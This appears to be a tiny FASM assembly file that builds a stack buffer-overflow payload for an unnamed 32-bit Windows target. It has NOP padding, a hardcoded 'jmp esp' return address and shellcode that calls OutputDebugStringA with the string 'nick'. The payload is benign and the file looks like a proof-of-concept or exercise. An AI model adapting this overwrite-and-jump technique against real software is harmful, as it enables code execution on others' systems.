;format PE
use32
include 'bare.inc'

db 0x34 dup(0x90)
dd 0x7c874413	;jmp esp
start:
xor eax, eax
push eax
push dword 0x6b63696e
push esp
mov eax, 0x7c85ad4c ;OutputDebugStringA
call eax
add esp, 8
db 0